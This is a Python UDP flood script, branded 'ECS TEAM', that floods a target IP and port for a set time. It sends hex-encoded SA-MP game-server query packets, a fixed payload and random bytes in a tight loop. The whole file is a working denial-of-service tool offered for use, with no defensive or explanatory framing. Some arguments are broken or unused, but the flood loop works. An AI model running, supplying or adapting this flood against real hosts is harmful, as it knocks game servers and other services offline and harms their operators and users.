# -*- coding: utf-8 -*-



from time import time as tt
import codecs
import struct
import argparse
import socket
import random
import os
Pacotes = [
      codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
      codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
      codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
      codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
      codecs.decode('081e62da', 'hex_codec'),
      codecs.decode('081e77da', 'hex_codec'),
      codecs.decode('081e4dda', 'hex_codec'),
      codecs.decode('021efd40', 'hex_codec'),
      codecs.decode('081e7eda', 'hex_codec')]
os.system("clear")
method = """
EXAULTS COMMUNITY`S
"""
payload = b"\x00\x02\x00\x2f"
os.system("clear")
def attack(ip, port, time, size, socks, size1, size2):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(method)
    print("\033[95m╦══════════════════════════════════════════════════════════════╦")
    print("\033[95m║\033[91m                         ECS TEAM                             \033[95m║")
    fmt = '\033[95m║\033[91m                     ECS TEAM SENT                            \033[95m║'.format(
        ip=ip,
        port='PORT {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    print("╩══════════════════════════════════════════════════════════════╩")
    
    print("╦══════════════════════════════════════════════════════════════╦")
    print("║     IP: {ip}                                              ║".format(ip=ip))
    print("║══════════════════════════════════════════════════════════════║")
    print("║     PORT: {port}                                                ║".format(port=port))
    print("║══════════════════════════════════════════════════════════════║")
    print("║     SIZE: {size}                                                ║".format(size=size))
    print("║══════════════════════════════════════════════════════════════║")
    print("║     TIME: {time}                                                ║".format(time=time))
    print("╩══════════════════════════════════════════════════════════════╩")
    #print("\033[95m╩══════════════════════════════════════════════════════╩")
    startup = tt()
    size = os.urandom(min(666, size))
    size1 = os.urandom(min(6666, size1))
    size2 = os.urandom(min(65532, size2))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break
 
        sock.sendto(payload, (ip, int(port)))
        sock.sendto(Pacotes[3], (ip, port))
        sock.sendto(size, (ip, port))
        sock.sendto(Pacotes[6], (ip, port))
        sock.sendto(payload, (ip, int(port)))
        sock.sendto(payload, (ip, int(port)))
        sock.sendto(payload, (ip, int(port)))

    print('\033[92mAttack Finished')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python ecskill.py <ip> -p <port> -t <time> -s <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-s', '--size', type=int, default=666, help='Size in bytes.')
    parser.add_argument('-socks', '--socks', type=str, default=None, help='Socks File')
    parser.add_argument('-s1', '--size1', type=int, default=None, help='Size in bytes.')
    parser.add_argument('-s2', '--size2', type=int, default=None, help='Size in bytes')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size, args.socks, args.size1, args.size2)
    except KeyboardInterrupt:
        print('Attack stopped.')
